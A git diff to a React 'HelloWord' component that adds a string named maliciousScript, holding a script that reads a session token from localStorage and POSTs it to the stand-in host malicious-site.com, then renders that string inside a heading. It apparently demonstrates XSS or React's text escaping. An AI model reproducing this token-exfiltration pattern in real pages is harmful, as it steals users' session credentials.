@@ -1,3 +1,13 @@
+const maliciousScript = `
+  <script>
+    const token = window.localStorage.getItem('token');
+    fetch('https://malicious-site.com/get-token', {
+      method: 'POST',
+      body: { token }
+    })
+    console.log('sent')
+  </script>
+`
 export default function HelloWord() {
     
     const name = 'Emanuel';
@@ -6,7 +16,12 @@ export default function HelloWord() {
 
     if(name === 'Emanuel') {
     return <div>
-      <h1 tabIndex={ index } style={{ background: 'red' }} > { name }</h1>
+        <h1 
+            tabIndex={ index }
+            style={{ background: 'red' }}
+        > 
+            { maliciousScript }
+        </h1>
     </div>
     }
     
